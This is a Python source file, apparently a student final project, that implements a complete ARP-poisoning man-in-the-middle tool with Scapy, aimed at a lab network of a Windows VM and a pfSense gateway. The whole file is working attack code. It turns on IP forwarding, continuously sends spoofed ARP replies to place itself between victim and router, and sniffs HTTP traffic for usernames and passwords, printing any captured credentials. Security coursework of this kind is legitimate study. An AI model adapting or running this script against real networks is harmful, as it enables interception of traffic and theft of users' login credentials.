from scapy.all import *
import sys
import os
import time

# ==============================================================================
# PROJECT: IT359 Final Project - Man-in-the-Middle Attack Tool
# AUTHORS: Forces of Nature (Nathan Thomison, TJ Gerst)
# DESCRIPTION: 
#   This tool performs an ARP Poisoning attack to intercept traffic between a 
#   Windows Victim and a pfSense Gateway. It includes a packet sniffer to 
#   capture unencrypted credentials (HTTP POST data).
# ==============================================================================

# ==============================================================================
# SECTION 1: CONFIGURATION
# Hardcoded values for the Proxmox Virtual Environment
# ==============================================================================
VICTIM_IP = "10.0.0.15"             # Windows 11 VM
VICTIM_MAC = "bc:24:11:a4:cd:e7"    # MAC Address of Windows VM

GATEWAY_IP = "10.0.0.1"             # pfSense Router Interface
GATEWAY_MAC = "5e:57:1b:53:37:5c"   # MAC Address of pfSense LAN

INTERFACE = "eth0"                  # Network Interface on Kali Linux
# ==============================================================================

def enable_ip_forwarding():
    """
    Enables IP forwarding on the Linux kernel.
    Without this, the victim would lose internet access because the attacker 
    machine would drop the packets instead of passing them to the router.
    """
    print("\n[*] SETUP: Enabling IP Forwarding...")
    # 'echo 1' into ip_forward turns the feature on
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def spoof(target_ip, spoof_ip, target_mac):
    """
    Sends a malicious ARP packet to the target.
    
    Args:
        target_ip: The IP we want to fool (e.g., Victim).
        spoof_ip: The IP we want to pretend to be (e.g., Gateway).
        target_mac: The hardware address of the target.
    """
    # op=2 indicates an ARP 'Reply' (even though the target didn't ask for it).
    # psrc=spoof_ip tells the target "I am this IP".
    # hwdst=target_mac ensures the packet goes to the right machine.
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    
    # verbose=False keeps the terminal clean
    send(packet, verbose=False, iface=INTERFACE)

def restore(dest_ip, source_ip, dest_mac, source_mac):
    """
    Restores the ARP table to its original state when the attack is finished.
    This prevents the victim from staying offline after we exit.
    """
    # We send the REAL mac address (hwsrc=source_mac) to the destination.
    packet = ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    
    # Send 4 times to ensure the network switch registers the change.
    send(packet, count=4, verbose=False, iface=INTERFACE)

def packet_callback(packet):
    """
    The Sniffer Function.
    This runs for every packet intercepted to check for sensitive data.
    """
    # We only care about TCP packets that contain Raw data (payloads)
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        try:
            # Decode the raw bytes into a readable string
            payload = packet[Raw].load.decode(errors='ignore')
            
            # Filter: We usually find passwords in HTTP POST requests
            keywords = ["username", "user", "login", "password", "pass", "email", "uname"]
            
            # Scan the payload for any of the keywords above
            for keyword in keywords:
                if keyword in payload:
                    print(f"\n[!!!] CAPTURED CREDENTIALS FOUND:\n{'-'*30}\n{payload}\n{'-'*30}\n")
                    break
        except Exception:
            # Ignore packets that can't be decoded (binary data, images, etc.)
            pass

def run_attack():
    """
    Main execution loop.
    1. Enables IP Forwarding.
    2. Starts the Background Sniffer.
    3. Loops the ARP Spoofing attack until CTRL+C is pressed.
    """
    enable_ip_forwarding()
    
    try:
        print(f"[*] ATTACK STARTED: Intercepting {VICTIM_IP} <--> {GATEWAY_IP}")
        print("[*] STATUS: Sniffer is running in background...")
        print("[*] INSTRUCTION: Log into the victim machine and browse HTTP sites.")
        print("[*] CONTROL: Press CTRL+C to stop the attack safely.\n")
        
        # AsyncSniffer runs in a separate thread so it doesn't block the loop below.
        # filter="tcp port 80" ensures we only look at web traffic.
        sniffer = AsyncSniffer(iface=INTERFACE, prn=packet_callback, filter="tcp port 80", store=False)
        sniffer.start()

        # Infinite loop to keep sending ARP packets (Keep-Alive)
        while True:
            spoof(VICTIM_IP, GATEWAY_IP, VICTIM_MAC)  # Tell Victim: "I am the Router"
            spoof(GATEWAY_IP, VICTIM_IP, GATEWAY_MAC) # Tell Router: "I am the Victim"
            time.sleep(2) # Wait 2 seconds between spoofing packets to be stealthy

    except KeyboardInterrupt:
        # Handle the user pressing CTRL+C
        print("\n\n[!] USER INTERRUPT DETECTED.")
        print("[*] CLEANUP: Restoring network ARP tables...")
        restore(VICTIM_IP, GATEWAY_IP, VICTIM_MAC, GATEWAY_MAC)
        restore(GATEWAY_IP, VICTIM_IP, GATEWAY_MAC, VICTIM_MAC)
        print("[*] DONE: Network restored. Exiting.")

if __name__ == "__main__":
    run_attack()